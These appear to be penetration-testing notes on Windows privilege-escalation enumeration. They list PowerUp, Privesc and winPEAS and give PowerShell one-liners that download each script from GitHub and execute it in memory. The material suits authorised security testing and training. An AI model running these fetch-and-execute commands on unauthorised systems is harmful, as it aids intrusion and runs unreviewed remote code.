- **PowerUp:** https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc 
- **Privesc:** https://github.com/enjoiz/Privesc 
- **winPEAS:** https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).


```powershell
# PowerUp
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1);Invoke-AllChecks

# Privesc
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/enjoiz/Privesc/refs/heads/master/privesc.ps1);Invoke-PrivEsc

# winPEAS
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1)
```